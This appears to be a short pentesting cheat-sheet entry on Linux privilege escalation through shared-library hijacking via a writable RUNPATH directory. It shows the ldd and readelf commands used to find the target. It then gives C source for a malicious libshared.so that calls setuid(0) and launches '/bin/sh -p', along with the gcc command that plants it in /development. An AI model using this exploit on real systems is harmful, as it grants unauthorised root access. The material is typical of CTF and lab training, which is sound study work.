#Linux_PrivilegeEscalation 

---

- Assume we have a binary called `test`. To check all the shared libraries this binary uses we can use the following command:
```bash
ldd test


linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)

```

- In the above, `libshared.so` looks like a non-standard library. We can load shared libraries from custom locations by setting the `RUNPATH` variable => To check this path we use the command below:
```bash
readelf -d test | grep RUNPATH
```

and assume we get the following output:
```bash
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

- We can then compile the following C-code to get root:
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

as follows:
```bash
gcc -fPIC -shared root.c -o /development/libshared.so
```
